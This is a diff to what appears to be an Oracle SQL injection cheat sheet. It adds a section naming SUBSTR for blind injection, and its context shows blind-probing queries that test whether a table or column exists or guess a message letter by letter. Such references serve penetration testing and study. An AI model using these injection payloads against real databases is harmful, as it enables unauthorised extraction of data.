@@ -16,6 +16,7 @@
 * [Oracle SQL List Tables](#oracle-sql-list-tables)
 * [Oracle SQL Error Based](#oracle-sql-error-based)
 * [Oracle SQL Blind](#oracle-sql-blind)
+    * [Oracle Blind With Substring Equivalent](#oracle-blind-with-substring-equivalent)
 * [Oracle SQL Time Based](#oracle-sql-time-based)
 * [Oracle SQL Out of Band](#oracle-sql-out-of-band)
 * [Oracle SQL Command Execution](#oracle-sql-command-execution)
@@ -127,6 +128,13 @@ When the injection point is inside a string use : `'||PAYLOAD--`
 | Table log_table exists   | `SELECT 1 FROM dual WHERE 1=(SELECT 1 from log_table);` |
 | Column message exists in table log_table | `SELECT COUNT(*) FROM user_tab_cols WHERE column_name = 'MESSAGE' AND table_name = 'LOG_TABLE';` |
 | First letter of first message is t | `SELECT message FROM log_table WHERE rownum=1 AND message LIKE 't%';` |
+
+
+### Oracle Blind With Substring Equivalent
+
+| Function    | Example                                   |
+| ----------- | ----------------------------------------- | 
+| `SUBSTR`    | `SUBSTR('foobar', <START>, <LENGTH>)`     | 
 
 
 ## Oracle SQL Time Based
